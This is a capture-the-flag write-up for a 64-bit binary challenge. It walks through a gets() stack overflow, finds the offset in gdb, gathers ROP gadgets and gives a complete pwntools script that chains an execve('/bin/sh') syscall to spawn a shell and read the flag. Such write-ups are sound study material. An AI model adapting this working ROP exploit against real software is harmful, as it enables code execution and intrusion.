# &#35; chall_14

#### &#42; purpose
1. find offset to input variable(local_48[56]) and *local_10
2. find leaked main() address

#### &#42; execute
```bash
## 1 file
$ ls ./chall_14
./chall_14

## 64-bit LSB, statically linked and not stripped
$ file ./chall_14
./chall_14: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=75469f99dc8b7cbf4afe29d19cb46a46a9cdf4c5, for GNU/Linux 3.2.0, not stripped

## Partial RELRO and Canary found
$ checksec --file=./chall_14
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1877) Symbols	  No	0		0		./chall_14

## just input twice
$ ./chall_14
You can hear the sound of a thousand...
AAAAAAAA
BBBBBBBB
$

```

#### &#42; disassemble using ghidra
```bash

## vulnerable point is gets(auStack104);
void main(void)

{
  undefined auStack104 [64];
  undefined auStack40 [32];
  
  puts(&UNK_00495008);
  fgets(auStack40,0x14,stdin);
  gets(auStack104);
  return;
}


## exploit structure
auStack104 [64] + auStack40[32] + sfp[8] + ret[8]

```


#### &#42; analysis binary using gdb
```bash

>>> "A"*96+"B"*8+"C"*6
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC'
>>>

gef➤  r
Starting program: /pwn/sunshine/14/chall_14
warning: Error disabling address space randomization: Operation not permitted
You can hear the sound of a thousand...
AAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x0000434343434343 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffe3e715170  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x0000000000400518  →  0x0000000000000000
$rcx   : 0x00000000004c0500  →  0x00000000fbad2288
$rdx   : 0x0
$rsp   : 0x00007ffe3e7151e0  →  0x0000000000000000
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x0000000001dfbf81  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdi   : 0x00000000004c2c80  →  0x0000000000000000
$rip   : 0x434343434343
$r8    : 0x00007ffe3e715170  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r9    : 0x0
$r10   : 0x00000000004c0800  →  0x0000000001dfc380  →  0x0000000000000000
$r11   : 0x246
$r12   : 0x0000000000402eb0  →  <__libc_csu_fini+0> endbr64
$r13   : 0x0
$r14   : 0x00000000004c0018  →  0x00000000004433c0  →  <__strcpy_sse2_unaligned+0> endbr64
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe3e7151e0│+0x0000: 0x0000000000000000	 ← $rsp
0x00007ffe3e7151e8│+0x0008: 0x0000000100000000
0x00007ffe3e7151f0│+0x0010: 0x00007ffe3e715308  →  0x00007ffe3e716878  →  "/pwn/sunshine/14/chall_14"
0x00007ffe3e7151f8│+0x0018: 0x0000000000401de5  →  <main+0> endbr64
0x00007ffe3e715200│+0x0020: 0x0000000000000000
0x00007ffe3e715208│+0x0028: 0x0000000600000000
0x00007ffe3e715210│+0x0030: 0x0000000a0000009e
0x00007ffe3e715218│+0x0038: 0x0000000000000090
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x434343434343
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall_14", stopped 0x434343434343 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤

#### do exploit using rop because memory address is changed

gef➤  ropper --search "pop r??; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r??; ret

[INFO] File: /pwn/sunshine/14/chall_14
.
.
0x0000000000449e87: pop rax; ret;
0x0000000000401da1: pop rbp; ret;
0x0000000000401ffb: pop rbx; ret;
0x000000000040191a: pop rdi; ret;
0x000000000040181f: pop rdx; ret;
0x000000000040f45e: pop rsi; ret;
.
.
gef➤  


$ ROPgadget --binary ./chall_14 > gadgets.txt
$ cat gadgets.txt | grep "mov qword ptr \[rdx\], rax ; ret"
0x00000000004197b2 : add edx, 0x60 ; mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x00000000004197b6 : mov eax, dword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x00000000004197b8 : mov qword ptr [rdx], rax ; ret
0x00000000004197b5 : mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret


gef➤  x/2i 0x4197b8
   0x4197b8 <_IO_remove_marker+56>:	mov    QWORD PTR [rdx],rax
   0x4197bb <_IO_remove_marker+59>:	ret
gef➤



```

#### &#42; structure of stack
```bash
auStack104 [56] + auStack40[32] + dummy[8] + sfp[8] + ret[8]
=> payload[96] + sfp[8] + ret[8]
=> payload[104] + ret[8]

```

#### &#42; payload(python)
```python
# bss = binsh("/bin/sh")
payload  = b"A"*104
payload += pop_rdx
payload += p64(bss)
payload += pop_rax
payload += binsh
payload += mov_rdx_rax


# execve("/bin/sh", 0, 0)
payload += pop_rax
payload += p64(0x3b)
payload += pop_rdi
payload += p64(bss)
payload += pop_rsi
payload += p64(0x0)
payload += pop_rdx
payload += p64(0x0)
payload += syscall

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

#context.log_level = "debug"

filename = "./chall_14"

conn = process(filename)
elf = ELF(filename)

bss = elf.bss()+0x100

'''

[INFO] File: /pwn/sunshine/14/chall_14
0x0000000000449e87: pop rax; ret;
0x000000000040191a: pop rdi; ret;
0x000000000040f45e: pop rsi; ret;
0x000000000040181f: pop rdx; ret;

0x0000000000417444: syscall; ret;

0x4197b8 <_IO_remove_marker+56>:	mov    QWORD PTR [rdx],rax
0x4197bb <_IO_remove_marker+59>:	ret

'''

mov_rdx_rax = p64(0x4197b8)

pop_rax = p64(0x0000000000449e87)
pop_rdi = p64(0x000000000040191a)
pop_rsi = p64(0x000000000040f45e)
pop_rdx = p64(0x000000000040181f)
syscall = p64(0x0000000000417444)

binsh = b"/bin/sh\x00"

# bss = binsh
payload  = b"A"*104
payload += pop_rdx
payload += p64(bss)
payload += pop_rax
payload += binsh
payload += mov_rdx_rax


# execve("/bin/sh", 0, 0)
payload += pop_rax
payload += p64(0x3b)
payload += pop_rdi
payload += p64(bss)
payload += pop_rsi
payload += p64(0x0)
payload += pop_rdx
payload += p64(0x0)

payload += syscall


#payload  = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC"

print( conn.recvline() )

conn.sendline("Z"*8)
with open("payload", "wb") as fd:
    fd.write("Z"*8+"\n")

conn.send(payload)
with open("payload", "ab") as fd:
    fd.write(payload+"\n")

conn.sendline(binsh)
with open("payload", "ab") as fd:
    fd.write(binsh)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python2 exp.py
[+] Starting local process './chall_14': pid 1664
[*] '/pwn/sunshine/14/chall_14'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
You can hear the sound of a thousand...

[*] Switching to interactive mode
$
$ cat flag.txt
sun{hail-to-the-king-c24f18e818fb4986}
$

```
